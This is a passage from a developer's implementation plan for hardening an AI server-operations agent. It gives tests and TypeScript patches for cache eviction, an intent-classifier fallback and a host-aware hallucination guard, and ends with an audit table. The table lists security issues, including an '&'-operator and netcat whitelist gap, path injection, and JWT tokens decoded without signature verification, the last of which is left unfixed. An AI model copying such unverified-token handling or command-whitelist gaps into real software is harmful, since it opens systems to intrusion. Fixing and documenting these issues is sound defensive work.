        for (let i = 0; i < evictCount; i++) {
            idempotencyCache.delete(entries[i][0]);
        }
    }
}
```

- [ ] **Step 3.3.2: Typecheck**

```bash
npm run typecheck
```

- [ ] **Step 3.3.3: Commit**

```bash
git add src/api/idempotency_guard.ts
git commit -m "perf(api): batch evict 20% of idempotency cache entries — avoid repeated O(n log n) sort"
```

---

## PHASE 4 — Logic & Guard Improvements

> Correctness improvements to the agent's reasoning safeguards.

---

### Task 4.1: Safe Intent Classifier Fallback (MED-2)

**Files:**
- Modify: `src/agents/intent_classifier.ts:139-144`

When the LLM classifier fails, the fallback sets `requiresTool: true` and `toolHint: 'execute_ssh_command'`. This forces a tool call on every message — even "thanks!" — during API outages.

- [ ] **Step 4.1.1: Write the failing test**

Create `src/agents/intent_classifier.test.ts`:

```typescript
import { describe, it, expect, vi } from 'vitest';

// Force the LLM call to throw — simulates API outage
vi.mock('../llm/provider.js', () => ({
    getLLMClient: vi.fn(() => ({
        client: {
            chat: {
                completions: {
                    create: vi.fn().mockRejectedValue(new Error('API rate limit exceeded')),
                },
            },
        },
        model: 'gpt-4o',
        provider: 'openai',
    })),
}));

import { classifyIntent } from './intent_classifier.js';

describe('classifyIntent fallback — LLM API outage', () => {
    it('does NOT set requiresTool=true for a casual message', async () => {
        const intent = await classifyIntent('thanks!');
        expect(intent.requiresTool).toBe(false);
    });

    it('does NOT set requiresTool=true for "ok"', async () => {
        const intent = await classifyIntent('ok');
        expect(intent.requiresTool).toBe(false);
    });

    it('DOES set requiresTool=true for obvious server action', async () => {
        const intent = await classifyIntent('nginx is down on production, fix it');
        expect(intent.requiresTool).toBe(true);
    });

    it('sets isAudit correctly via regex override for audit keywords', async () => {
        const intent = await classifyIntent('run a full health check');
        expect(intent.isAudit).toBe(true);
    });
});
```

- [ ] **Step 4.1.2: Run test to confirm casual messages fail (requiresTool=true)**

```bash
npx vitest run src/agents/intent_classifier.test.ts
```

Expected: FAIL — "thanks!" gets `requiresTool: true`.

- [ ] **Step 4.1.3: Replace the fallback block in `classifyIntent`**

Replace lines 134–144 with a keyword-based heuristic:

```typescript
// Fallback: LLM is unavailable. Use keyword heuristics — conservative defaults.
const isAuditOverride = AUDIT_OVERRIDE_PATTERNS.some(p => p.test(messageText));
const isApproval = /^(yes|yep|correct|that'?s correct|this is correct|continue|keep going|proceed|go ahead|apply|fix|do it)$/i.test(messageText.trim());

// Only set requiresTool if the message contains clear operational intent keywords.
// This prevents forced tool calls on casual/conversational messages during outages.
const OPERATIONAL_KEYWORDS = /\b(nginx|mysql|mariadb|php|ssl|disk|apache|redis|server|website|domain|fix|repair|restart|check|diagnose|audit|scan|status|down|error|fail|crash|timeout)\b/i;
const requiresTool = OPERATIONAL_KEYWORDS.test(messageText) || isAuditOverride;

return {
    ...defaultIntent,
    isAudit: isAuditOverride,
    isApprovalResponse: isApproval,
    requiresTool,
    toolHint: requiresTool ? 'execute_ssh_command' : 'none',
};
```

- [ ] **Step 4.1.4: Run test to confirm it passes**

```bash
npx vitest run src/agents/intent_classifier.test.ts
```

Expected: PASS

- [ ] **Step 4.1.5: Commit**

```bash
git add src/agents/intent_classifier.ts src/agents/intent_classifier.test.ts
git commit -m "fix(agent): safe intent classifier fallback — use operational keyword heuristic instead of forcing requiresTool=true on API outage"
```

---

### Task 4.2: Host-Aware Hallucination Guard (MED-4)

**Files:**
- Modify: `src/agents/hallucination_guard.ts`
- Modify: `src/agents/loop.ts` (call site for `checkForHallucination`)

The hallucination guard checks whether ANY write receipt exists across ALL hosts. In a multi-server session, a fix on `server-A` could suppress hallucination detection for claims about `server-B`.

- [ ] **Step 4.2.1: Write the failing test**

Append to the hallucination guard test file (or create `src/agents/hallucination_guard.test.ts`):

```typescript
import { describe, it, expect } from 'vitest';
import { checkForHallucination } from './hallucination_guard.js';
import { type ToolReceipt } from './loop.js';

function makeReceipt(host: string, success = true): ToolReceipt {
    return {
        toolName: 'fix_nginx_config',
        success,
        host,
        timestamp: Date.now(),
        outputHash: 'abc123',
    };
}

describe('host-aware hallucination guard', () => {
    it('does NOT flag write claim when write receipt exists for the SAME host', () => {
        const receipts = new Map([['fix_nginx_config:server-a', makeReceipt('server-a')]]);
        const isHallucination = checkForHallucination(
            'Nginx is now fixed and running',
            receipts,
            60_000,
            'server-a'  // ← current host context
        );
        expect(isHallucination).toBe(false);
    });

    it('DOES flag write claim when write receipt is for a DIFFERENT host', () => {
        const receipts = new Map([['fix_nginx_config:server-a', makeReceipt('server-a')]]);
        const isHallucination = checkForHallucination(
            'Nginx is now fixed and running',
            receipts,
            60_000,
            'server-b'  // ← different host — receipt from server-a should not count
        );
        expect(isHallucination).toBe(true);
    });

    it('falls back to host-agnostic check when no currentHost provided', () => {
        const receipts = new Map([['fix_nginx_config:server-a', makeReceipt('server-a')]]);
        const isHallucination = checkForHallucination(
            'Nginx is now fixed and running',
            receipts,
            60_000
            // no currentHost
        );
        // Without host context, any write receipt satisfies the check (safe default)
        expect(isHallucination).toBe(false);
    });
});
```

- [ ] **Step 4.2.2: Run test to confirm it fails**

```bash
npx vitest run src/agents/hallucination_guard.test.ts
```

Expected: FAIL — host-specific check doesn't exist yet.

- [ ] **Step 4.2.3: Update `checkForHallucination` signature and `hasReceipt` logic**

In `src/agents/hallucination_guard.ts`, update the function signature:

```typescript
export function checkForHallucination(
    text: string,
    executionReceipts: Map<string, ToolReceipt>,
    freshnessMs: number,
    currentHost?: string    // ← new optional param
): boolean {
    return hallucinationPatterns.some(({ pattern, requiresWriteReceipt, requiresTool: req }) => {
        if (!pattern.test(text)) return false;

        if (requiresWriteReceipt) {
            // If we know the current host, only receipts for that host count
            if (currentHost) {
                const hasHostReceipt = [...executionReceipts.values()].some(
                    r => WRITE_RECEIPTS.includes(r.toolName) &&
                         r.host === currentHost &&
                         r.success &&
                         (Date.now() - r.timestamp) < freshnessMs
                );
                return !hasHostReceipt;
            }
            // No host context — fall back to host-agnostic check
            return !hasReceipt(executionReceipts, WRITE_RECEIPTS, true, freshnessMs);
        }

        if (req) {
            return !hasReceipt(executionReceipts, [req], true, freshnessMs);
        }

        return true;
    });
}
```

- [ ] **Step 4.2.4: Update the call site in `loop.ts` to pass `currentHost`**

Find where `checkForHallucination` is called in `loop.ts` and add the current server host:

```typescript
const isHallucination = checkForHallucination(
    assistantText,
    executionReceipts,
    RECEIPT_FRESHNESS_MS,
    currentServer?.ip  // ← pass the resolved server IP as currentHost
);
```

`currentServer` should already be in scope from the intent resolution block. If not, use `intent.targetServer` as the host context.

- [ ] **Step 4.2.5: Run tests to confirm they pass**

```bash
npx vitest run src/agents/hallucination_guard.test.ts
```

Expected: PASS

- [ ] **Step 4.2.6: Typecheck**

```bash
npm run typecheck
```

- [ ] **Step 4.2.7: Commit**

```bash
git add src/agents/hallucination_guard.ts src/agents/hallucination_guard.test.ts src/agents/loop.ts
git commit -m "feat(agent): host-aware hallucination guard — write receipt from server-A no longer suppresses guard for server-B claims"
```

---

## Self-Review

**Spec coverage check:**

| Audit Issue | Task | Covered? |
|---|---|---|
| CRIT-2: In-memory approval CAS | Task 1.1 | ✅ |
| CRIT-3: fix_nginx_config path injection | Task 1.2 | ✅ |
| MED-10: & operator + nc whitelist | Task 1.3 | ✅ |
| MED-3: Hardcoded IP | Task 1.4 | ✅ |
| HIGH-2: Plaintext Cloudstick credentials | Task 2.1 | ✅ |
| CRIT-7: Tool approval key encoding | Task 2.2 | ✅ |
| CRIT-1: SSH pool recursive overflow | Task 3.1 | ✅ |
| HIGH-1: Session last-write-wins | Task 3.2 | ✅ |
| MED-5: Idempotency guard O(n log n) | Task 3.3 | ✅ |
| MED-2: Intent classifier bad fallback | Task 4.1 | ✅ |
| MED-4: Host-agnostic hallucination guard | Task 4.2 | ✅ |
| HIGH-3: JWT without signature verification | Not fixed — requires Cloudstick API HMAC secret. Document only. | ⚠️ |

**HIGH-3 note:** `decodeCloudstickJwtUserId` cannot verify the JWT signature without the Cloudstick signing secret. Document in code that this is a known limitation and add a warning log. The exploitability is self-limiting (Cloudstick API rejects mismatched credentials) but should be tracked.

**Placeholder scan:** No TBDs or TODOs in task bodies — all steps include complete code.

**Type consistency:** `ToolReceipt` is imported from `loop.js` in hallucination_guard — this is the existing pattern. `expectedVersion` on `upsertSession` is optional so callers without OCC context continue to work.
